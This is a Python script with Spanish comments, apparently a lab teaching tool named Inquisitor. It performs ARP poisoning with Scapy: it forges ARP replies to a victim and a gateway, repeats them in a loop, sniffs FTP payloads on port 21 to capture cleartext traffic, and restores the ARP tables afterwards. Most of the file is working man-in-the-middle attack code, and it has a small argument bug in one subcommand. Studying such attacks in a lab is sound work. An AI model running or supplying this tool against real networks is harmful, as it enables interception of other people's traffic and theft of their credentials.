#!/usr/bin/python3
"""
Inquisitor.py

Herramienta pedagogica para probar tramas ARP con Scapy en un laboratorio contenerizado:
- Escuchar paquetes ARP.
- Construir y enviar paquetes ARP.
- Simular ARP poisoning en laboratorio y restaurar tablas ARP.
"""
import argparse
import ipaddress
import re
import time
import logging
from typing import Optional
from scapy.all import ARP, Ether, IP, TCP, Raw, conf, get_if_hwaddr, get_if_addr, sendp, sniff, srp1
from threading import Thread

'''
Objetos importados:
- ARP, Ether: Clases de paquetes para construir ARP requests/respuestas.
- conf: Configuracion de Scapy (para obtener interfaz por defecto).
- get_if_hwaddr: Funcion para obtener MAC de una interfaz.
- send: Funcion para enviar paquetes.
- sniff: Funcion para capturar paquetes en la red.
'''

# Usar el logger que usa Scapy internamente para mostrar todos los mensajes
# Por defecto viene con un nivel de WARNING, lo que oculta muchos mensajes INFO o DEBUG.
logging.getLogger("scapy").setLevel(logging.DEBUG)

#Gracias LLM por la regex lo uso para validar los MAC
MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")


def valid_ipv4(value: str) -> str:
    '''
    Validar que el string es una IPv4 valida usando ipaddress.IPv4Address.
    '''
    try:
        ipaddress.IPv4Address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"IPv4 invalida: {value}") from exc
    return value


def valid_mac(value: str) -> str:
    if not MAC_RE.match(value):
        raise argparse.ArgumentTypeError(f"MAC invalida: {value}")
    return value.lower()


class Inquisitor:
    '''
    Clase principal para el laboratorio ARP:
    Methodos:
        - monitorizar_arp: Escucha paquetes ARP y los muestra.
        - build_request/build_reply: Construye paquetes ARP personalizados.
        - send_packet: Envia paquetes ARP.
        - poison_once: Envia un par de ARP replies para envenenar tablas.
        - poison_loop: Ejecuta poison_once en un loop con intervalo.
        - restore: Envia ARP replies legitimos para restaurar tablas.
    '''
    def __init__(self, iface: Optional[str] = None):
        self.iface = iface or conf.iface # Usar interfaz de Scapy si no se especifica
        self.own_ip = get_if_addr(self.iface) # Obtener IP de la interfaz usada (Atacante)
        self.own_mac = get_if_hwaddr(self.iface) # Obtener MAC de la interfaz usada (Atacante)

    def monitorizar_arp(self, count: int = 0, timeout: Optional[int] = None) -> None:
        '''
        https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html#scapy.sendrecv.sniff
        
        BLOQUEANTE: Ejecuta un sniffer que captura paquetes ARP y los printeo.
        - iface: Interfaz a escuchar (default: la de Scapy) desde el objeto conf.
        - filter: Filtro BPF para capturar solo ARP.
        - prn: Funcion callback que procesa cada paquete capturado.
        - count: Numero maximo de paquetes a capturar (0 = infinito).
        - timeout: Tiempo maximo en segundos para capturar (None = sin timeout).
        '''
        def paquete_entrante(pkt):
            if ARP not in pkt:
                return

            print("\n[ + ] Paquete ARP capturado:")
            print(pkt.summary())
            print("\n")

            arp = pkt[ARP]
            op_name = "request" if arp.op == 1 else "reply" if arp.op == 2 else f"op={arp.op}" # Determinar tipo paquete ARP
            print(f"[ARP {op_name}] " + f"IPsrc={arp.psrc} MACsrc={arp.hwsrc} " + f"-> IPdst={arp.pdst} MACdst={arp.hwdst}")

        print(f"### Escuchando ARP en interfaz {self.iface}... ###")
        sniff(
            iface=self.iface,
            filter="arp",
            prn=paquete_entrante,
            store=False,
            count=count,
            timeout=timeout)
    
    def monitorizar_TCP(self) -> None:
        '''
        Metodo adicional para monitorizar trafico TCP (ejemplo para FTP).
        No se usa en el laboratorio ARP pero puede ser util para ver el resultado del ARP poisoning.
        '''
        def paquete_entrante(pkt):
            if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
                return

            payload = pkt[Raw].load.decode("utf-8", errors="ignore").strip()
            src_ip  = pkt[IP].src
            dst_ip  = pkt[IP].dst
            if pkt[TCP].dport == 21 or pkt[TCP].sport == 21: # Filtrar solo trafico FTP (puerto 21)
                print(f"\n[TCP] {src_ip} -> {dst_ip} | Payload: {payload}\n")

        print(f"### Escuchando TCP en interfaz {self.iface}... ###")
        sniff(
            iface=self.iface,
            filter="tcp",
            prn=paquete_entrante,
            store=False)

    def paquete_ARP_solicitud_MAC_victima(self, target_ip: str, src_ip: Optional[str] = None, src_mac: Optional[str] = None):
        src_mac = src_mac or self.own_mac  # Si no se especifica MAC, usar la del atacante
        src_ip = src_ip or self.own_ip  # Si no se especifica IP, usar la de la interfaz (Atacante)
        # Preguntamos a la red "¿Quien tiene target_ip?" con una solicitud ARP (request) y nos responden con la MAC del target_ip si esta activo. 
        # En este caso el target_ip seria la victima. Nos permite conocer su MAC. 
        paquete_ARP_solicitud_MAC_victima = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) / ARP( #Sintaxis de Scapy para apilar capas: Ethernet(IP) / ARP
            op=1,  # Trama ARP de tipo request (solicitud)
            psrc=src_ip,  # IP de origen (quien pregunta)
            pdst=target_ip,  # IP de destino (quien se pregunta)
            hwsrc=src_mac,  # MAC de origen (quien pregunta)
            hwdst="00:00:00:00:00:00"  # MAC de destino desconocida (en request se pone a ceros)
            )
        return paquete_ARP_solicitud_MAC_victima

    def paquete_ARP_respuesta_solicitud_MAC(self, target_ip: str, target_mac: str, claimed_ip: str, src_mac: Optional[str] = None):
        src_mac = src_mac or self.own_mac
        # La inversa del metodo anterior pero ahora nosotros respondemos a la victima a la pregunta de "¿Quien tiene target_ip?" 
        # y nosotros respondemos con "target_ip esta en src_mac" (que es la MAC del atacante para ARP poisoning/spoofing)
        
        # Nos llega un request preguntando "¿Quien tiene target_ip?" y respondemos "target_ip esta en src_mac" (que es la MAC del atacante para ARP poisoning/spoofing)
        # permite hacernos pasar por el target_ip ante la victima. 
        # Si target_ip es el gateway, la victima nos enviara su trafico pensando que somos el gateway, y nosotros podremos interceptar ese trafico
        

        # Aqui me hago un lio pero :
            # pdst: Es la IP a la que le estoy respondiendo, es decir, la victima.
            # hwdst: Es la MAC a la que le estoy respondiendo, es decir, la victima.
            # psrc: Es la IP que estoy reclamando ser, es decir, la IP que quiero envenenar, por ejemplo el gateway.
            # hwsrc: Es la MAC desde la que estoy respondiendo, es decir, la del atacante.

        paquete_ARP_respuesta_solicitud_MAC = Ether(dst=target_mac, src=src_mac) / ARP( 
            op=2,  # Trama ARP de tipo reply (respuesta)
            pdst=target_ip,  # IP de destino (A quien se responde)
            hwdst=target_mac,  # MAC de destino (A quien se responde)
            psrc=claimed_ip,  # IP que se esta "falsificando" o reclamando ser
            hwsrc=src_mac,  # MAC de origen (quien responde) la del atacante para el caso de ARP poisoning/spoofing
        )

        # Hacia la víctima:

        # pdst = victim_ip
        # hwdst = victim_mac
        # psrc = gateway_ip
        # hwsrc = attacker_mac

        # Hacia el gateway:

        # pdst = gateway_ip
        # hwdst = gateway_mac
        # psrc = victim_ip
        # hwsrc = attacker_mac
        return paquete_ARP_respuesta_solicitud_MAC

    def enviar_paquete(self, pkt, count: int = 1, interval: float = 0.0) -> None:
        sendp(pkt, iface=self.iface, count=count, inter=interval, verbose=False)

    def enviar_paquete_y_esperar_respuesta_ARP(self, pkt, timeout: int = 2) -> Optional[ARP]:
        respuesta = srp1(pkt, iface=self.iface, timeout=timeout, verbose=False)
        if respuesta and respuesta.haslayer(ARP):
            print(f"Respuesta ARP recibida: {respuesta.summary()}\n")
            return respuesta[ARP]
        print(respuesta.summary() if respuesta else "No se recibio respuesta ARP")
        return None

    def envenenar_una_sola_vez(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str) -> None:
        # Envenenar a la victima diciendole que el gateway_ip esta en nuestra MAC
        to_victim = self.paquete_ARP_respuesta_solicitud_MAC(victim_ip, victim_mac, gateway_ip) # la mac la saco en el init

        # Envenenar al gateway diciendole que la victima_ip esta en nuestra MAC
        to_gateway = self.paquete_ARP_respuesta_solicitud_MAC(gateway_ip, gateway_mac, victim_ip)

        self.enviar_paquete_y_esperar_respuesta_ARP(to_victim, timeout=1)
        self.enviar_paquete_y_esperar_respuesta_ARP(to_gateway, timeout=1)

    def envenenar_en_bucle(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str, period: float) -> None:
        print("[] Iniciando ARP poison loop (Ctrl+C para detener y restaurar)")
        sent = 0
        try:
            while True:
                self.envenenar_una_sola_vez(victim_ip, victim_mac, gateway_ip, gateway_mac)
                sent += 2
                print(f"\r[*] Paquetes enviados: {sent}", end="", flush=True)
                time.sleep(period)
        except KeyboardInterrupt:
            print("\n[*] Interrupcion recibida")
            self.restaurar(victim_ip, victim_mac, gateway_ip, gateway_mac)

    def restaurar(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str) -> None:
        print("\n### Restaurando tablas ARP... ###")

        # Respuesta ARP legitima hacia la victima: gateway_ip -> gateway_mac
        pkt_to_victim = Ether(dst=victim_mac, src=gateway_mac) / ARP(
            op=2,
            pdst=victim_ip,
            hwdst=victim_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
        )
        # Respuesta ARP legitima hacia el gateway: victim_ip -> victim_mac
        pkt_to_gateway = Ether(dst=gateway_mac, src=victim_mac) / ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=victim_ip,
            hwsrc=victim_mac,
        )

        self.enviar_paquete(pkt_to_victim, count=5, interval=0.2)
        self.enviar_paquete(pkt_to_gateway, count=5, interval=0.2)
        print("\n### Restauracion completada ###")

    def Inquisitor(self, ip_target: str, ip_gateway: str) -> None:
        pkt_victima = self.paquete_ARP_solicitud_MAC_victima(ip_target)
        pkt_victima.show()
        respuesta_mac_victima = self.enviar_paquete_y_esperar_respuesta_ARP(pkt_victima)

        pkt_router = self.paquete_ARP_solicitud_MAC_victima(ip_gateway)
        pkt_router.show()
        respuesta_mac_router = self.enviar_paquete_y_esperar_respuesta_ARP(pkt_router)

        if not respuesta_mac_victima or not respuesta_mac_router:
            print("No se pudieron resolver MACs de victima/gateway")
            return

        thread = Thread(
            target=self.envenenar_en_bucle,
            kwargs={
                "victim_ip": ip_target,
                "victim_mac": respuesta_mac_victima.hwsrc,
                "gateway_ip": ip_gateway,
                "gateway_mac": respuesta_mac_router.hwsrc,
                "period": 1.5,
            },
            daemon=True,
        )
        thread.start()

        try:
            self.monitorizar_TCP()
        except KeyboardInterrupt:
            pass
        finally:
            self.restaurar(ip_target, respuesta_mac_victima.hwsrc, ip_gateway, respuesta_mac_router.hwsrc)



def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="Inquisitor",
        description="Laboratorio contenerizado para pruebas ARP con Scapy",
        epilog="Ejemplo: Inquisitor.py sniff --count 10\nEjemplo: Inquisitor.py poison --victim-ip 192.168.1.100 --victim-mac 00:11:22:33:44:55 --gateway-ip 192.168.1.1 --gateway-mac 00:aa:bb:cc:dd:ee\n"
    )
    parser.add_argument("--iface", default=None, help="Interfaz de red (por defecto la que encuentre Scapy operativa, disponible en conf.iface)")


    #https://docs.python.org/3/library/argparse.html#subcommands
    # Descubierto subparsers me permite  manejar mejor los args de los comandos: 
        # Necesito
        # - escuchar(monitorizar_arp), 
        # - enviar-arp(solicitud), 
        # - enviar-r-arp(respuesta),
        # - envenenar una sola vez  -> SPOOF
        # - envenenar(bucle)        -> POISONING
        # - restaurar tablas ARP    -> RESTORE
    sub = parser.add_subparsers(dest="command", required=True)

    sniff_cmd = sub.add_parser("escuchar", help="Escuchar paquetes ARP")
    sniff_cmd.add_argument("--count", type=int, default=0, help="Numero de paquetes (0=infinito)")
    sniff_cmd.add_argument("--timeout", type=int, default=None, help="Timeout en segundos")

    req_cmd = sub.add_parser("enviar-arp", help="Construir/enviar solicitud ARP")
    req_cmd.add_argument("--src-ip", default=None, type=valid_ipv4)
    req_cmd.add_argument("--target-ip", required=True, type=valid_ipv4)
    req_cmd.add_argument("--src-mac", default=None, type=valid_mac)
    req_cmd.add_argument("--count", type=int, default=1)

    rep_cmd = sub.add_parser("enviar-r-arp", help="Construir/enviar respuesta ARP")
    rep_cmd.add_argument("--target-ip", required=True, type=valid_ipv4)
    rep_cmd.add_argument("--target-mac", required=True, type=valid_mac)
    rep_cmd.add_argument("--claimed-ip", default=True, type=valid_ipv4)
    rep_cmd.add_argument("--src-mac", default=None, type=valid_mac)
    rep_cmd.add_argument("--count", type=int, default=1)

    poison_cmd = sub.add_parser("envenenar", help="Spoof ARP una vez o en bucle")
    poison_cmd.add_argument("--mantener", action="store_true", help="Mantener envenenamiento en bucle (Ctrl+C para restaurar)")
    poison_cmd.add_argument("--victim-ip", required=True, type=valid_ipv4)
    poison_cmd.add_argument("--victim-mac", required=True, type=valid_mac)
    poison_cmd.add_argument("--gateway-ip", required=True, type=valid_ipv4)
    poison_cmd.add_argument("--gateway-mac", required=True, type=valid_mac)
    poison_cmd.add_argument("--period", type=float, default=1.5, help="Segundos entre ciclos (solo con --mantener)")

    restore_cmd = sub.add_parser("restaurar", help="Restaurar tablas ARP")
    restore_cmd.add_argument("--victim-ip", required=True, type=valid_ipv4)
    restore_cmd.add_argument("--victim-mac", required=True, type=valid_mac)
    restore_cmd.add_argument("--gateway-ip", required=True, type=valid_ipv4)
    restore_cmd.add_argument("--gateway-mac", required=True, type=valid_mac)

    inquisitor_cmd = sub.add_parser("inquisitor", help="Ejecutar ataque ARP poisoning completo y monitorizar TCP")
    inquisitor_cmd.add_argument("--target-ip", required=True, type=valid_ipv4, help="IP de la victima a envenenar")
    inquisitor_cmd.add_argument("--gateway-ip", required=True, type=valid_ipv4, help="IP del gateway a envenenar")

    return parser

def main() -> None:
    args = build_parser().parse_args()
    
    lab = Inquisitor(args.iface) # None si no se especifica, lo que hace que el init use la interfaz de Scapy por defecto (conf.iface)
    print(f"\n[*] Interfaz seleccionada: {lab.iface} | Atacante: {get_if_addr(lab.iface)}/{lab.own_mac}\n")
    print(f"[*]\tComando: {args.command}\n")

    match args.command: # Match en vez de if-elif-else
        case "escuchar":
            lab.monitorizar_arp(count=args.count, timeout=args.timeout)
        case "enviar-arp":
            pkt = lab.paquete_ARP_solicitud_MAC_victima(args.target_ip)
            pkt.show()
            lab.enviar_paquete_y_esperar_respuesta_ARP(pkt)
        case "enviar-r-arp":
            pkt = lab.paquete_ARP_respuesta_solicitud_MAC(args.target_ip, args.target_mac, args.src_ip, args.src_mac)
            pkt.show()
            lab.enviar_paquete_y_esperar_respuesta_ARP(pkt)
        case "envenenar":
            if args.mantener:
                lab.envenenar_en_bucle(
                    victim_ip=args.victim_ip,
                    victim_mac=args.victim_mac,
                    gateway_ip=args.gateway_ip,
                    gateway_mac=args.gateway_mac,
                    period=args.period)
            else:
                lab.envenenar_una_sola_vez(
                    victim_ip=args.victim_ip,
                    victim_mac=args.victim_mac,
                    gateway_ip=args.gateway_ip,
                    gateway_mac=args.gateway_mac)

        case "restaurar":
            lab.restaurar(
                victim_ip=args.victim_ip,
                victim_mac=args.victim_mac,
                gateway_ip=args.gateway_ip,
                gateway_mac=args.gateway_mac)
        case "inquisitor":
            lab.Inquisitor(ip_target=args.target_ip, ip_gateway=args.gateway_ip)

        case _:
            print(f"Comando desconocido: {args.command}")

if __name__ == "__main__":
    main()


#Victima MAC: da:b0:68:05:3d:95
#Gateway MAC: 66:d1:81:e7:5c:fd
#Gateway IP:  172.20.0.10
#Victima IP:  172.20.0.20

